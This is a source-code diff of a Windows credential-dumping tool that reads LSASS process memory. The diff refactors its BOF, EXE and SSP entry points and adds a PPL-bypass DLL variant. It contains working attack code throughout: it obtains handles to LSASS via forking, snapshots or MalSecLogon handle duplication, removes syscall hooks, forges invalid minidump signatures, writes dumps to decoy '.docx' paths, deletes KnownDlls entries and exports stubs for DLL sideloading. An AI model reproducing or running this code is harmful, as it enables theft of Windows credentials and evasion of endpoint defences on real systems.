@@ -1,3 +1,4 @@
+#include "entry.h"
 
 #ifdef BOF
  #include "nanodump.c"
@@ -21,14 +22,20 @@ void go(char* args, int length)
     BOOL           success;
     BOOL           get_pid_and_leave;
     BOOL           use_malseclogon;
+    HANDLE         hProcess = NULL;
+    BOOL           forked_lsass = FALSE;
     LPCSTR         malseclogon_target_binary = NULL;
+    PPROCESS_LIST  created_processes = NULL;
+    HANDLE         hSnapshot = NULL;
     wchar_t        wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
-    HANDLE         hSnapshot;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
     full_dump_path.MaximumLength = 0;
+
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
 
     BeaconDataParse(&parser, args, length);
     lsass_pid = BeaconDataInt(&parser);
@@ -46,7 +53,7 @@ void go(char* args, int length)
     {
         get_full_path(&full_dump_path, dump_path);
         if (!create_file(&full_dump_path))
-            return;
+            goto end;
     }
 
     remove_syscall_callback_hook();
@@ -56,7 +63,7 @@ void go(char* args, int length)
     {
         lsass_pid = get_lsass_pid();
         if (!lsass_pid)
-            return;
+            goto end;
     }
     else
     {
@@ -71,11 +78,10 @@ void go(char* args, int length)
 
     success = enable_debug_priv();
     if (!success)
-        return;
+        goto end;
 
     BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
     BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
-    PPROCESS_LIST created_processes = NULL;
 
     if (use_malseclogon)
     {
@@ -87,13 +93,12 @@ void go(char* args, int length)
             use_valid_sig,
             use_malseclogon_locally,
             lsass_pid,
-            &created_processes
-        );
+            &created_processes);
         // delete the uploaded nanodump binary
         if (use_malseclogon_locally)
             delete_file(malseclogon_target_binary);
         if (!success)
-            return;
+            goto end;
         if (use_malseclogon_locally)
             return;
     }
@@ -112,11 +117,9 @@ void go(char* args, int length)
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
-            &dc.ImplementationVersion
-        );
+            &dc.ImplementationVersion);
     }
 
-    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
     // if we used MalSecLogon remotely, the handle won't have PROCESS_CREATE_PROCESS;
     if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
@@ -124,34 +127,32 @@ void go(char* args, int length)
         permissions = LSASS_CLONE_PERMISSIONS;
     }
 
-    HANDLE hProcess = obtain_lsass_handle(
+    hProcess = obtain_lsass_handle(
         lsass_pid,
         permissions,
         duplicate_handle,
         FALSE,
-        dump_path
-    );
+        dump_path);
     if (!hProcess)
-        return;
+        goto end;
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
     if ((fork_lsass || snapshot_lsass) && use_malseclogon)
     {
         hProcess = make_handle_full_access(
-            hProcess
-        );
+            hProcess);
         if (!hProcess)
-            return;
+            goto end;
     }
 
     // avoid reading LSASS directly by making a fork
     if (fork_lsass)
     {
         hProcess = fork_process(
-            hProcess
-        );
+            hProcess);
         if (!hProcess)
-            return;
+            goto end;
+        forked_lsass = TRUE;
     }
 
     // avoid reading LSASS directly by making a snapshot
@@ -159,22 +160,16 @@ void go(char* args, int length)
     {
         hProcess = snapshot_process(
             hProcess,
-            &hSnapshot
-        );
+            &hSnapshot);
         if (!hProcess)
-            return;
+            goto end;
     }
 
     // allocate a chuck of memory to write the dump
     SIZE_T region_size = DUMP_MAX_SIZE;
     PVOID base_address = allocate_memory(&region_size);
     if (!base_address)
-    {
-        NtClose(hProcess); hProcess = NULL;
-        if (write_dump_to_disk)
-            delete_file(dump_path);
-        return;
-    }
+        goto end;
 
     dc.hProcess    = hProcess;
     dc.BaseAddress = base_address;
@@ -182,84 +177,59 @@ void go(char* args, int length)
     dc.DumpMaxSize = region_size;
 
     success = NanoDumpWriteDump(&dc);
-
-    // kill the clone of the LSASS process
-    if (fork_lsass)
-    {
-        kill_process(
-            0,
-            hProcess
-        );
-    }
-
-    // close the handle
-    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
-
-    // free the created snapshot
-    if (snapshot_lsass)
-    {
-        free_snapshot(
-            hSnapshot
-        );
-        hSnapshot = NULL;
-    }
-
-    // if we used MalSecLogon remotely, kill the created processes
-    if (use_malseclogon_remotely)
-    {
-        kill_created_processes(created_processes);
-        created_processes = NULL;
-    }
-
     if (!success)
-    {
-        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-        if (write_dump_to_disk)
-            delete_file(dump_path);
-        return;
-    }
+        goto end;
 
     DPRINT(
         "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024
-    );
+        (dc.rva/1024)/1024);
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(
         dc.BaseAddress,
-        dc.rva
-    );
+        dc.rva);
 
     if (write_dump_to_disk)
     {
         success = write_file(
             &full_dump_path,
             dc.BaseAddress,
-            dc.rva
-        );
+            dc.rva);
     }
     else
     {
         success = download_file(
             dump_path,
             dc.BaseAddress,
-            dc.rva
-        );
+            dc.rva);
     }
-    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
 
     if (!success)
-    {
-        if (write_dump_to_disk)
-            delete_file(dump_path);
-        return;
-    }
+        goto end;
 
     print_success(
         dump_path,
         use_valid_sig,
-        write_dump_to_disk
-    );
+        write_dump_to_disk);
+
+    success = TRUE;
+
+end:
+    if (forked_lsass)
+        kill_process(0, hProcess);
+    if (hProcess)
+        NtClose(hProcess);
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (!success && write_dump_to_disk)
+        delete_file(dump_path);
+    if (hSnapshot)
+        free_snapshot(hSnapshot);
+    if (created_processes)
+    {
+        kill_created_processes(created_processes);
+        intFree(created_processes); created_processes = NULL;
+    }
 }
 
 #elif defined(NANO) && defined(EXE)
@@ -291,29 +261,35 @@ int main(int argc, char* argv[])
 {
     dump_context   dc;
     DWORD          lsass_pid                 = 0;
+    HANDLE         hProcess                  = NULL;
     BOOL           fork_lsass                = FALSE;
+    BOOL           forked_lsass              = FALSE;
     BOOL           snapshot_lsass            = FALSE;
     BOOL           duplicate_handle          = FALSE;
     LPCSTR         dump_path                 = NULL;
-    BOOL           success                   = TRUE;
+    BOOL           success                   = FALSE;
     BOOL           use_valid_sig             = FALSE;
     BOOL           get_pid_and_leave         = FALSE;
     BOOL           use_malseclogon           = FALSE;
     BOOL           is_malseclogon_stage_2    = FALSE;
     LPCSTR         malseclogon_target_binary = NULL;
+    HANDLE         hSnapshot                 = NULL;
+    PPROCESS_LIST  created_processes         = NULL;
     wchar_t        wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
-    HANDLE         hSnapshot;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
     full_dump_path.MaximumLength = 0;
 
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
+
 #ifdef _M_IX86
     if(local_is_wow64())
     {
         PRINT_ERR("Nanodump does not support WoW64");
-        return -1;
+        return 0;
     }
 #endif
 
@@ -334,7 +310,7 @@ int main(int argc, char* argv[])
             if (i + 1 >= argc)
             {
                 PRINT("missing --write value");
-                return -1;
+                return 0;
             }
             dump_path = argv[++i];
             get_full_path(&full_dump_path, dump_path);
@@ -345,7 +321,7 @@ int main(int argc, char* argv[])
             if (i + 1 >= argc)
             {
                 PRINT("missing --pid value");
-                return -1;
+                return 0;
             }
             i++;
             lsass_pid = atoi(argv[i]);
@@ -353,7 +329,7 @@ int main(int argc, char* argv[])
                 strspn(argv[i], "0123456789") != strlen(argv[i]))
             {
                 PRINT("Invalid PID: %s", argv[i]);
-                return -1;
+                return 0;
             }
         }
         else if (!strncmp(argv[i], "-f", 3) ||
@@ -387,18 +363,18 @@ int main(int argc, char* argv[])
             if (i + 1 >= argc)
             {
                 PRINT("missing --binary value");
-                return -1;
+                return 0;
             }
             malseclogon_target_binary = argv[++i];
             if (!strrchr(malseclogon_target_binary, '\\'))
             {
                 PRINT("You must provide a full path: %s", malseclogon_target_binary);
-                return -1;
+                return 0;
             }
             if (!file_exists(malseclogon_target_binary))
             {
                 PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
-                return -1;
+                return 0;
             }
         }
         else if (!strncmp(argv[i], "-h", 3) ||
@@ -410,26 +386,26 @@ int main(int argc, char* argv[])
         else
         {
             PRINT("invalid argument: %s", argv[i]);
-            return -1;
+            return 0;
         }
     }
 
     if (!full_dump_path.Length && !get_pid_and_leave)
     {
         usage(argv[0]);
-        return -1;
+        return 0;
     }
 
     if (use_malseclogon && !duplicate_handle && !is_full_path(dump_path))
     {
         PRINT("If MalSecLogon is being used locally, you need to provide the full path: %s", dump_path);
-        return -1;
+        return 0;
     }
 
     if (fork_lsass && snapshot_lsass)
     {
         PRINT("The options --fork and --snapshot cannot be used at the same time");
-        return -1;
+        return 0;
     }
 
     remove_syscall_callback_hook();
@@ -439,7 +415,7 @@ int main(int argc, char* argv[])
     {
         lsass_pid = get_lsass_pid();
         if (!lsass_pid)
-            return -1;
+            goto end;
     }
     else
     {
@@ -456,24 +432,24 @@ int main(int argc, char* argv[])
     {
         PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
         usage(argv[0]);
-        return -1;
+        return 0;
     }
 
     if (duplicate_handle && use_malseclogon && !malseclogon_target_binary)
     {
         PRINT("If --dup and --malseclogon are used, you need to provide a binary with --binary");
-        return -1;
+        return 0;
     }
 
     if ((!duplicate_handle || !use_malseclogon) && malseclogon_target_binary)
     {
         PRINT("The option --binary can only be used with --malseclogon and --dup");
-        return -1;
+        return 0;
     }
 
     success = enable_debug_priv();
     if (!success)
-        return -1;
+        goto end;
 
     if (use_malseclogon && !malseclogon_target_binary)
         malseclogon_target_binary = argv[0];
@@ -481,12 +457,11 @@ int main(int argc, char* argv[])
     BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
     BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
     BOOL is_malseclogon_stage_1 = use_malseclogon && !is_malseclogon_stage_2;
-    PPROCESS_LIST created_processes = NULL;
 
     if (!is_malseclogon_stage_2)
     {
         if (!create_file(&full_dump_path))
-            return -1;
+            goto end;
     }
 
     if (is_malseclogon_stage_1)
@@ -499,10 +474,9 @@ int main(int argc, char* argv[])
             use_valid_sig,
             use_malseclogon_locally,
             lsass_pid,
-            &created_processes
-        );
+            &created_processes);
         if (!success)
-            return -1;
+            goto end;
         if (use_malseclogon_locally)
             return 0;
     }
@@ -521,45 +495,41 @@ int main(int argc, char* argv[])
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
-            &dc.ImplementationVersion
-        );
+            &dc.ImplementationVersion);
     }
 
-    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
     if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
     {
         permissions = LSASS_CLONE_PERMISSIONS;
     }
 
-    HANDLE hProcess = obtain_lsass_handle(
+    hProcess = obtain_lsass_handle(
         lsass_pid,
         permissions,
         duplicate_handle,
         is_malseclogon_stage_2,
-        dump_path
-    );
+        dump_path);
     if (!hProcess)
-        return -1;
+        goto end;
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
     if ((fork_lsass || snapshot_lsass) && use_malseclogon)
     {
         hProcess = make_handle_full_access(
-            hProcess
-        );
+            hProcess);
         if (!hProcess)
-            return -1;
+            goto end;
     }
 
     // avoid reading LSASS directly by making a fork
     if (fork_lsass)
     {
         hProcess = fork_process(
-            hProcess
-        );
+            hProcess);
         if (!hProcess)
-            return -1;
+            goto end;
+        forked_lsass = TRUE;
     }
 
     // avoid reading LSASS directly by making a snapshot
@@ -567,21 +537,16 @@ int main(int argc, char* argv[])
     {
         hProcess = snapshot_process(
             hProcess,
-            &hSnapshot
-        );
+            &hSnapshot);
         if (!hProcess)
-            return -1;
+            goto end;
     }
 
     // allocate a chuck of memory to write the dump
     SIZE_T region_size = DUMP_MAX_SIZE;
     PVOID base_address = allocate_memory(&region_size);
     if (!base_address)
-    {
-        NtClose(hProcess); hProcess = NULL;
-        delete_file(dump_path);
-        return -1;
-    }
+        goto end;
 
     dc.hProcess    = hProcess;
     dc.BaseAddress = base_address;
@@ -589,75 +554,53 @@ int main(int argc, char* argv[])
     dc.DumpMaxSize = region_size;
 
     success = NanoDumpWriteDump(&dc);
-
-    // kill the clone of the LSASS process
-    if (fork_lsass)
-    {
-        kill_process(
-            0,
-            hProcess
-        );
-    }
-
-    // close the handle
-    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
-
-    // free the created snapshot
-    if (snapshot_lsass)
-    {
-        free_snapshot(
-            hSnapshot
-        );
-        hSnapshot = NULL;
-    }
-
-    // if we used MalSecLogon remotely, kill the created processes
-    if (use_malseclogon_remotely)
-    {
-        kill_created_processes(created_processes);
-        created_processes = NULL;
-    }
-
     if (!success)
-    {
-        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-        delete_file(dump_path);
-        return -1;
-    }
+        goto end;
 
     DPRINT(
         "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024
-    );
+        (dc.rva/1024)/1024);
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(
         dc.BaseAddress,
-        dc.rva
-    );
+        dc.rva);
 
     success = write_file(
         &full_dump_path,
         dc.BaseAddress,
-        dc.rva
-    );
-
-    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+        dc.rva);
 
     if (!success)
-    {
-        delete_file(dump_path);
-        return -1;
-    }
+        goto end;
 
     if (!is_malseclogon_stage_2)
     {
         print_success(
             dump_path,
             use_valid_sig,
-            TRUE
-        );
+            TRUE);
     }
+
+    success = TRUE;
+
+end:
+    if (forked_lsass)
+        kill_process(0, hProcess);
+    if (hProcess)
+        NtClose(hProcess);
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (!success)
+        delete_file(dump_path);
+    if (hSnapshot)
+        free_snapshot(hSnapshot);
+    if (created_processes)
+    {
+        kill_created_processes(created_processes);
+        intFree(created_processes); created_processes = NULL;
+    }
+
     return 0;
 }
 
@@ -665,7 +608,7 @@ int main(int argc, char* argv[])
 
 #include "ssp.h"
 
-BOOL NanoDump(void)
+BOOL NanoDumpSSP(void)
 {
     /******************* change this *******************/
     LPCSTR dump_path     = "C:\\Windows\\Temp\\report.docx";
@@ -676,15 +619,19 @@ BOOL NanoDump(void)
     BOOL           success;
     wchar_t        wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
+    BOOL           bReturnValue = FALSE;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
     full_dump_path.MaximumLength = 0;
 
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
+
     get_full_path(&full_dump_path, dump_path);
 
     if (!create_file(&full_dump_path))
-        return FALSE;
+        goto end;
 
     // set the signature
     if (use_valid_sig)
@@ -698,8 +645,7 @@ BOOL NanoDump(void)
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
-            &dc.ImplementationVersion
-        );
+            &dc.ImplementationVersion);
     }
 
     // we are LSASS after all :)
@@ -709,10 +655,7 @@ BOOL NanoDump(void)
     SIZE_T region_size = DUMP_MAX_SIZE;
     PVOID base_address = allocate_memory(&region_size);
     if (!base_address)
-    {
-        delete_file(dump_path);
-        return FALSE;
-    }
+        goto end;
 
     dc.hProcess    = hProcess;
     dc.BaseAddress = base_address;
@@ -721,45 +664,41 @@ BOOL NanoDump(void)
 
     success = NanoDumpWriteDump(&dc);
     if (!success)
-    {
-        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-        delete_file(dump_path);
-        return FALSE;
-    }
+        goto end;
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(
         dc.BaseAddress,
-        dc.rva
-    );
+        dc.rva);
 
     success = write_file(
         &full_dump_path,
         dc.BaseAddress,
-        dc.rva
-    );
-
-    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+        dc.rva);
 
     if (!success)
-    {
-        delete_file(dump_path);
-        return FALSE;
-    }
+        goto end;
 
-    return TRUE;
+    bReturnValue = TRUE;
+
+end:
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (!bReturnValue)
+        delete_file(dump_path);
+
+    return bReturnValue;
 }
 
 __declspec(dllexport) BOOL APIENTRY DllMain(
     HINSTANCE hinstDLL,
     DWORD fdwReason,
-    LPVOID lpReserved
-)
+    LPVOID lpReserved)
 {
     switch (fdwReason)
     {
         case DLL_PROCESS_ATTACH:
-            NanoDump();
+            NanoDumpSSP();
             break;
         case DLL_THREAD_ATTACH:
             break;
@@ -770,5 +709,400 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
     }
     return FALSE;
 }
+
+#elif defined(NANO) && defined(PPL)
+
+#include "ppl/cleanup.h"
+
+BOOL NanoDumpPPL(VOID)
+{
+    dump_context   dc;
+    BOOL           bReturnValue      = FALSE;
+    HANDLE         hProcess          = NULL;
+    DWORD          lsass_pid         = 0;
+    BOOL           fork_lsass        = FALSE;
+    BOOL           snapshot_lsass    = FALSE;
+    BOOL           duplicate_handle  = FALSE;
+    BOOL           success           = TRUE;
+    BOOL           use_valid_sig     = FALSE;
+    BOOL           use_malseclogon   = FALSE;
+    BOOL           binary_provided   = FALSE;
+    PPROCESS_LIST  created_processes = NULL;
+    HANDLE         hSnapshot         = NULL;
+    SIZE_T         region_size       = 0;
+    PVOID          base_address      = NULL;
+    CHAR           dump_path[MAX_PATH];
+    CHAR           malseclogon_target_binary[MAX_PATH];
+    WCHAR          wcFilePath[MAX_PATH];
+    UNICODE_STRING full_dump_path;
+
+    full_dump_path.Buffer        = wcFilePath;
+    full_dump_path.Length        = 0;
+    full_dump_path.MaximumLength = 0;
+
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
+
+#ifdef _M_IX86
+    if(local_is_wow64())
+    {
+        PRINT_ERR("Nanodump does not support WoW64");
+        return FALSE;
+    }
+#endif
+
+    //remove_syscall_callback_hook();
+
+    success = delete_known_dll_entry();
+    if (!success)
+        goto end;
+
+    CommandLineToArgvW_t CommandLineToArgvW;
+    CommandLineToArgvW = (CommandLineToArgvW_t)(ULONG_PTR)get_function_address(
+        get_library_address(SHELL32_DLL, TRUE),
+        CommandLineToArgvW_SW2_HASH,
+        0);
+    if (!CommandLineToArgvW)
+    {
+        api_not_found("CommandLineToArgvW");
+        goto end;
+    }
+    GetCommandLineW_t GetCommandLineW;
+    GetCommandLineW = (GetCommandLineW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetCommandLineW_SW2_HASH,
+        0);
+    if (!GetCommandLineW)
+    {
+        api_not_found("GetCommandLineW");
+        goto end;
+    }
+
+    LPWSTR* argv = NULL;
+    int argc = 0;
+    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    if (!argv || !argc)
+        goto end;
+
+    for (int i = 1; i < argc; ++i)
+    {
+        if (!_wcsicmp(argv[i], L"-v") ||
+            !_wcsicmp(argv[i], L"--valid"))
+        {
+            use_valid_sig = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-w") ||
+                 !_wcsicmp(argv[i], L"--write"))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --write value");
+                goto end;
+            }
+            wcstombs(dump_path, argv[++i], MAX_PATH);
+            get_full_path(&full_dump_path, dump_path);
+        }
+        else if (!_wcsicmp(argv[i], L"-p") ||
+                 !_wcsicmp(argv[i], L"--pid"))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --pid value");
+                goto end;
+            }
+            i++;
+            lsass_pid = wcstoul(argv[i], NULL, 10);
+        }
+        else if (!_wcsicmp(argv[i], L"-f") ||
+                 !_wcsicmp(argv[i], L"--fork"))
+        {
+            fork_lsass = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-s") ||
+                 !_wcsicmp(argv[i], L"--snapshot"))
+        {
+            snapshot_lsass = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-d") ||
+                 !_wcsicmp(argv[i], L"--dup"))
+        {
+            duplicate_handle = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-m") ||
+                 !_wcsicmp(argv[i], L"--malseclogon"))
+        {
+            use_malseclogon = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-b") ||
+                 !_wcsicmp(argv[i], L"--binary"))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --binary value");
+                goto end;
+            }
+            wcstombs(malseclogon_target_binary, argv[++i], MAX_PATH);
+            binary_provided = TRUE;
+        }
+        else
+        {
+            PRINT("invalid argument: %s", argv[i]);
+            goto end;
+        }
+    }
+
+    LocalFree(argv); argv = NULL;
+
+    if (!full_dump_path.Length)
+        goto end;
+
+    if (fork_lsass && snapshot_lsass)
+    {
+        PRINT("The options --fork and --snapshot cannot be used at the same time");
+        goto end;
+    }
+
+    if (use_malseclogon && (fork_lsass || snapshot_lsass))
+    {
+        PRINT("In this mode, MalSecLogon cannot be used with --fork or --snapshot.");
+        goto end;
+    }
+
+    if (use_malseclogon && !duplicate_handle)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
+        goto end;
+    }
+
+    if (use_malseclogon && !binary_provided)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
+        goto end;
+    }
+
+    if (binary_provided &&
+        !is_full_path(malseclogon_target_binary))
+    {
+        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
+        goto end;
+    }
+
+    if (binary_provided &&
+        !file_exists(malseclogon_target_binary))
+    {
+        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
+        goto end;
+    }
+
+    // if not provided, get the PID of LSASS
+    if (!lsass_pid)
+    {
+        lsass_pid = get_lsass_pid();
+        if (!lsass_pid)
+            goto end;
+    }
+    else
+    {
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+    }
+
+    if (!full_dump_path.Length)
+    {
+        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
+        goto end;
+    }
+
+    success = enable_debug_priv();
+    if (!success)
+        goto end;
+
+    if (!create_file(&full_dump_path))
+        goto end;
+
+    if (use_malseclogon)
+    {
+        success = MalSecLogon(
+            malseclogon_target_binary,
+            dump_path,
+            fork_lsass,
+            snapshot_lsass,
+            use_valid_sig,
+            FALSE,
+            lsass_pid,
+            &created_processes);
+        if (!success)
+            goto end;
+    }
+
+    // set the signature
+    if (use_valid_sig)
+    {
+        DPRINT("Using a valid signature");
+        dc.Signature = MINIDUMP_SIGNATURE;
+        dc.Version = MINIDUMP_VERSION;
+        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    }
+    else
+    {
+        DPRINT("Using a invalid signature");
+        generate_invalid_sig(
+            &dc.Signature,
+            &dc.Version,
+            &dc.ImplementationVersion);
+    }
+
+    DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
+    if ((fork_lsass || snapshot_lsass) && !use_malseclogon)
+    {
+        permissions = LSASS_CLONE_PERMISSIONS;
+    }
+
+    hProcess = obtain_lsass_handle(
+        lsass_pid,
+        permissions,
+        duplicate_handle,
+        FALSE,
+        dump_path);
+    if (!hProcess)
+        goto end;
+
+    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
+    if ((fork_lsass || snapshot_lsass) && use_malseclogon)
+    {
+        hProcess = make_handle_full_access(
+            hProcess);
+        if (!hProcess)
+            goto end;
+    }
+
+    // avoid reading LSASS directly by making a fork
+    if (fork_lsass)
+    {
+        hProcess = fork_process(
+            hProcess);
+        if (!hProcess)
+            goto end;
+    }
+
+    // avoid reading LSASS directly by making a snapshot
+    if (snapshot_lsass)
+    {
+        hProcess = snapshot_process(
+            hProcess,
+            &hSnapshot);
+        if (!hProcess)
+            goto end;
+    }
+
+    // allocate a chuck of memory to write the dump
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
+    if (!base_address)
+        goto end;
+
+    dc.hProcess    = hProcess;
+    dc.BaseAddress = base_address;
+    dc.rva         = 0;
+    dc.DumpMaxSize = region_size;
+
+    success = NanoDumpWriteDump(&dc);
+
+    // kill the clone of the LSASS process
+    if (fork_lsass)
+    {
+        kill_process(
+            0,
+            hProcess);
+    }
+
+    if (!success)
+        goto end;
+
+    DPRINT(
+        "The dump was created successfully, final size: %d MiB",
+        (dc.rva/1024)/1024);
+
+    // at this point, you can encrypt or obfuscate the dump
+    encrypt_dump(
+        dc.BaseAddress,
+        dc.rva);
+
+    success = write_file(
+        &full_dump_path,
+        dc.BaseAddress,
+        dc.rva);
+
+    if (!success)
+        goto end;
+
+    bReturnValue = TRUE;
+
+end:
+    if (argv)
+        LocalFree(argv);
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (hProcess)
+        NtClose(hProcess);
+    if (hSnapshot)
+        free_snapshot(hSnapshot);
+    if (!bReturnValue)
+        delete_file(dump_path);
+    if (created_processes)
+    {
+        kill_created_processes(created_processes);
+        intFree(created_processes);
+    }
+
+    return bReturnValue;
+}
+
+__declspec(dllexport) BOOL APIENTRY DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved)
+{
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            NanoDumpPPL();
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+
+// Windows 8.1 -> SspiCli.dll
+//
+//   000000014005B1C8  LogonUserExExW SspiCli
+//
+void APIENTRY LogonUserExExW() {}
+
+//
+// Windows 10 -> EventAggregation.dll
+//
+//   0000000140083728  EaDeleteAggregatedEvent EventAggregation
+//   0000000140083730  BriCreateBrokeredEvent EventAggregation
+//   0000000140083738  EaCreateAggregatedEvent EventAggregation
+//   0000000140083740  BriDeleteBrokeredEvent EventAggregation
+//   0000000140083748  EACreateAggregateEvent EventAggregation
+//   0000000140083750  EaQueryAggregatedEventParameters EventAggregation
+//   0000000140083758  EaFreeAggregatedEventParameters EventAggregation
+//   0000000140083760  EADeleteAggregateEvent EventAggregation
+//   0000000140083768  EAQueryAggregateEventData EventAggregation
+void APIENTRY BriCreateBrokeredEvent() {}
+void APIENTRY BriDeleteBrokeredEvent() {}
+void APIENTRY EaCreateAggregatedEvent() {}
+void APIENTRY EACreateAggregateEvent() {}
+void APIENTRY EaQueryAggregatedEventParameters() {}
+void APIENTRY EAQueryAggregateEventData() {}
+void APIENTRY EaFreeAggregatedEventParameters() {}
+void APIENTRY EaDeleteAggregatedEvent() {}
+void APIENTRY EADeleteAggregateEvent() {}
 
 #endif
